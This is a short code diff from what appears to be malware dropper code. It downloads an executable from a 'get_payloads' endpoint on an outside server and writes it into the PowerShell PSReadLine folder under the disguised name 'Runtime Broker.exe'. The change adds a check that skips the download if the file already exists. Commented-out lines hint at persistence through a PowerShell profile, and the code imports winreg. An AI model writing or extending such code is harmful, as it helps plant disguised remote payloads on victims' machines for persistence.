@@ -148,9 +148,10 @@ try {
         import winreg
 
         file_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\Runtime Broker.exe"
-        response = requests.get(f"{url}get_payloads/{download_path}.exe")
-        with open(file_path, "wb") as file:
-            file.write(response.content)
+        if not os.path.exists(file_path):
+            response = requests.get(f"{url}get_payloads/{download_path}.exe")
+            with open(file_path, "wb") as file:
+                file.write(response.content)
 
         # try:
         # create_powershell_profile(file_path, "Runtime Broker")
